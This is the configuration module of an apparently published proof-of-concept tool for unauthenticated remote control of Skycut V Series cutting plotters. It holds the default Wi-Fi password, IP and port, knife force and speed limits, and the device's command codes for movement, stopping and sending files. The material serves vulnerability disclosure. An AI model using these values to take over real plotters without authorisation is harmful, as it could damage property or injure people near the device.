# Module: config.py
# Part of the Skycut V Series Cutting Plotter Unauthenticated Remote Control
# Author: Omar Elshopky (omarelshopky.com)
#
# Full Write-up: https://medium.com/@omarelshopky/wireless-weapons-turning-skycut-plotters-into-physical-dangers-9f29e0cd357a
# Advisory: https://github.com/omarelshopky/skycut-v-series-cutting-plotter-unauth-remote-control-poc

DEFAULT_WIFI_NAME_NIDDLE = "CUTTER"
DEFAULT_WIFI_PASSWORD = "12345678"

DEFAULT_IP = "192.168.16.254"
DEFAULT_PORT = 8080

MAX_PACKET_LENGTH = 1024

DEFAULT_KNIFE_FORCE = 56
DEFAULT_KNIFE_SPEED = 9
DEFAULT_EMPTY_RUN = 6

MAX_KNIFE_FORCE = 160
MAX_KNIFE_SPEED = 13
MAX_EMPTY_RUN = 13

GCODES = {
    "TEST_CONNECTION": "RSVER;",
    "PAUSE": ";BD:100,7;",
    "STOP": ";BD:100,6;",
    "TEST": ";SYSTEST8,0;",
    "SET_EMPTY_RUN": "BD:100,10,<VARIABLE>;",
    "SET_KNIFE_SPEED": "BD:100,11,<VARIABLE>;",
    "SET_KNIFE_FORCE": "BD:100,12,<VARIABLE>;",
    "UP": ";BD:100,3;",
    "DOWN": ";BD:100,4;",
    "RIGHT": ";BD:100,2;",
    "LEFT": ";BD:100,1;",
    "NOOP": ";BD:100,0;",
    "SEND_FILE": "<RAW_DATA>"
}